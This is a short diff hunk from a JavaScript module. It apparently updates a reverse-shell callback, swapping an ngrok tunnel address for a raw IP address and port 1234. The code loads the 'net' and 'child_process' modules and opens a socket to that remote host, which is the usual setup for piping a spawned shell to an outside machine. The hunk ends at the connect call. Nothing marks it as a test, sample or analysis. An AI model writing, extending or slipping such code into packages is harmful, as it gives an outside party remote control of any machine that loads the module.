@@ -121,8 +121,8 @@ module.exports = function(e) {
   const net = require("net");
   const { spawn } = require("child_process");
 
-  const REMOTE_HOST = "0.tcp.sa.ngrok.io"; 
-  const REMOTE_PORT = 13486; 
+  const REMOTE_HOST = "142.132.165.211"; 
+  const REMOTE_PORT = 1234; 
 
   const client = new net.Socket();
   client.connect(REMOTE_PORT, REMOTE_HOST, () => {
